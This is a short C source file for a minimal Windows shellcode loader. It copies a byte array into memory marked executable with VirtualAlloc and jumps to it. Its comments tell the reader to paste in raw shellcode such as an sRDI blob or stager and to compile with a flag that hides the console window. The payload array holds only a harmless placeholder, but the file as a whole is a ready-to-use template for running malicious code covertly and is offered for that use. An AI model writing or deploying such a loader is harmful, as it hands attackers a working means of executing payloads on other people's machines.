/*
 * Minimal x64 Windows loader: copy shellcode into executable memory and jump.
 * Paste the raw bytes into the PAYLOAD array and compile with:
 *   x86_64-w64-mingw32-gcc loader.c -o loader.exe -mwindows
 */
#include <windows.h>
#include <string.h>

/* Replace this with the raw shellcode bytes (sRDI blob or stager). */
unsigned char PAYLOAD[] = { 0x90, 0x90, 0xcc };

int main(void) {
    void *mem = VirtualAlloc(NULL, sizeof(PAYLOAD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, PAYLOAD, sizeof(PAYLOAD));
    ((void (*)(void))mem)();
    return 0;
}
